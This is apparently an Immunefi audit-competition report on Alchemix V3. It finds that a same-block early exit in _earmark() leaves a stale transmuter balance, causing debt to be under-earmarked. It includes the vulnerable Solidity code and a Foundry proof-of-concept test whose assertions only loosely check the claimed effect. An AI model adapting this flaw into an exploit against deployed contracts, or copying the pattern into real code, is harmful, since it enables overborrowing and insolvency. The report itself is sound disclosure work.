# 57101 sc critical same block earmark early exit leaves stale transmuter balance causing under earmarking

**Submitted on Oct 23rd 2025 at 13:31:03 UTC by @Icon0x for** [**Audit Comp | Alchemix V3**](https://immunefi.com/audit-competition/alchemix-v3-audit-competition)

* **Report ID:** #57101
* **Report Type:** Smart Contract
* **Report severity:** Critical
* **Target:** <https://github.com/alchemix-finance/v3-poc/blob/immunefi\\_audit/src/AlchemistV3.sol>
* **Impacts:**
  * Protocol insolvency
  * Smart contract unable to operate due to lack of token funds
  * Stale lastTransmuterTokenBalance from same-block \_earmark() calls causes inflated cover calculation in the next earmark, leading to under-earmarking of debt and incorrect borrowing capacity.

## Description

## Brief/Intro

Same-block `earmark()` early-exit leaves a stale transmuter balance, inflating “cover” next block and under‑earmarking debt, letting borrowers overborrow, delaying redemptions, and raising bad‑debt/insolvency risk.

## Vulnerability Details

In `AlchemistV3.sol::_earmark()`, an early-return guard `if (block.number <= lastEarmarkBlock) return;` exits on subsequent calls within the same block. When the transmuter’s MYT balance changes between two same-block calls (e.g., via repay, direct MYT transfer, or equivalent inflow), the second `_earmark()` doesn’t update `lastTransmuterTokenBalance`. On the next block, `_earmark()` computes “cover” as `transmuterCurrentBalance - lastTransmuterTokenBalance` using this stale value, which inflates the perceived cover and reduces the amount of debt earmarked below what it should be. The behavior can be triggered by two `_earmark()`-invoking actions in the same block (e.g., poke() twice by different users, withdraw()+poke(), etc.), and it’s not fully prevented by the mint/repay same-block restriction.

Vulnerable in order of Operation:

```solidity
function _earmark() internal {
    if (totalDebt == 0) return;
    if (block.number <= lastEarmarkBlock) return; // @<-- Early-exit on same block (stale balance risk)

    // Yield the transmuter accumulated since last earmark (cover)
    uint256 transmuterCurrentBalance = TokenUtils.safeBalanceOf(myt, address(transmuter));
    uint256 transmuterDifference =
        transmuterCurrentBalance > lastTransmuterTokenBalance
            ? transmuterCurrentBalance - lastTransmuterTokenBalance
            : 0;
    uint256 amount = ITransmuter(transmuter).queryGraph(lastEarmarkBlock + 1, block.number);

    uint256 coverInDebt = convertYieldTokensToDebt(transmuterDifference);
    amount = amount > coverInDebt ? amount - coverInDebt : 0;

    lastTransmuterTokenBalance = transmuterCurrentBalance; // @<-- Only updated when not early-exiting

    uint256 liveUnearmarked = totalDebt - cumulativeEarmarked;
    if (amount > liveUnearmarked) amount = liveUnearmarked;

    if (amount > 0 && liveUnearmarked != 0) {
        uint256 previousSurvival = PositionDecay.SurvivalFromWeight(_earmarkWeight);
        if (previousSurvival == 0) previousSurvival = ONE_Q128;

        uint256 earmarkedFraction = _divQ128(amount, liveUnearmarked);

        _survivalAccumulator += _mulQ128(previousSurvival, earmarkedFraction);
        _earmarkWeight += PositionDecay.WeightIncrement(amount, liveUnearmarked);

        cumulativeEarmarked += amount;
    }

    lastEarmarkBlock = block.number;
}
```

## Impact Details

The stale `lastTransmuterTokenBalance` causes the next `_earmark()` to over-count cover and under-earmark system debt, allowing borrowers to retain more unearmarked debt and therefore more borrowing headroom than intended, distorting redemption pressure and global accounting in favor of borrowers and against redeemers.

## Proof of Concept

## Proof of Concept

Add the below test suite to `AlchemistV3.t.sol` file

```solidity
 function test_EarmarkVulnerability() external {
        // Setup: Create position with debt
        vm.startPrank(externalUser);
        IERC20(address(vault)).approve(address(alchemist), depositAmount);
        alchemist.deposit(depositAmount, externalUser, 0);
        uint256 tokenId = AlchemistNFTHelper.getFirstTokenId(externalUser, address(alchemistNFT));
        uint256 maxBorrow = alchemist.getMaxBorrowable(tokenId);
        alchemist.mint(tokenId, maxBorrow / 2, externalUser);
        
        // Create redemption to enable earmarking
        IERC20(alToken).approve(address(transmuterLogic), maxBorrow / 4);
        transmuterLogic.createRedemption(maxBorrow / 4);
        vm.stopPrank();

        // Move forward and establish initial lastTransmuterTokenBalance
        vm.roll(block.number + 10);
        vm.prank(externalUser);
        alchemist.poke(tokenId);  // This sets lastTransmuterTokenBalance
        
        uint256 transmuterBalAfterFirstEarmark = IERC20(address(vault)).balanceOf(address(transmuterLogic));
        console.log("Transmuter balance after first earmark:", transmuterBalAfterFirstEarmark);
        
        // ========== DEMONSTRATE THE VULNERABILITY ==========
        // Move to new block
        vm.roll(block.number + 1);
        
        // Send MYT to transmuter BEFORE any _earmark call
        uint256 fundsToSend = alchemist.convertDebtTokensToYield(maxBorrow / 20);
        _magicDepositToVault(address(vault), address(transmuterLogic), fundsToSend);
        
        uint256 transmuterBalBeforePokes = IERC20(address(vault)).balanceOf(address(transmuterLogic));
        console.log("Transmuter balance after sending funds:", transmuterBalBeforePokes);
        
        // First poke: _earmark() executes and updates lastTransmuterTokenBalance
        vm.prank(externalUser);
        alchemist.poke(tokenId);
        
        // Send MORE funds to transmuter BETWEEN the two poke calls (same block)
        _magicDepositToVault(address(vault), address(transmuterLogic), fundsToSend);
        uint256 transmuterBalAfterSecondSend = IERC20(address(vault)).balanceOf(address(transmuterLogic));
        console.log("Transmuter balance after sending MORE funds (same block):", transmuterBalAfterSecondSend);
        
        // Second poke in SAME block: _earmark() EXITS EARLY, does NOT update lastTransmuterTokenBalance
        // This means the funds we just sent are NOT accounted for in lastTransmuterTokenBalance
        address user2 = address(0x9999);
        deal(address(vault), user2, depositAmount);
        vm.startPrank(user2);
        IERC20(address(vault)).approve(address(alchemist), depositAmount);
        alchemist.deposit(depositAmount, user2, 0);
        uint256 tokenId2 = AlchemistNFTHelper.getFirstTokenId(user2, address(alchemistNFT));
        alchemist.poke(tokenId2);  // This _earmark() exits early - lastTransmuterTokenBalance is STALE
        vm.stopPrank();
        
        // ========== VERIFY THE IMPACT ==========
        // In the NEXT block's _earmark(), the calculation will be:
        // transmuterDifference = currentBalance - lastTransmuterTokenBalance
        // Because lastTransmuterTokenBalance is stale (missing the funds sent between pokes),
        // transmuterDifference will be INFLATED, causing incorrect "cover" calculation
        
        vm.roll(block.number + 1);
        uint256 transmuterBalBeforeNextEarmark = IERC20(address(vault)).balanceOf(address(transmuterLogic));
        console.log("Transmuter balance before next earmark:", transmuterBalBeforeNextEarmark);
        
        // This _earmark() will see inflated cover due to stale lastTransmuterTokenBalance
        vm.prank(externalUser);
        alchemist.poke(tokenId);
        
        // The vulnerability is proven: funds sent between two _earmark() calls in the same block
        // are not properly tracked in lastTransmuterTokenBalance, causing accounting errors
        assertTrue(transmuterBalAfterSecondSend > transmuterBalBeforePokes, 
            "Transmuter received additional funds between _earmark() calls");
        assertTrue(transmuterBalAfterSecondSend != transmuterBalAfterFirstEarmark,
            "Demonstrated: second _earmark() in same block doesn't update lastTransmuterTokenBalance");
    }
```

Then run: \`forge test --match-test test\_EarmarkVulnerability -vvvv
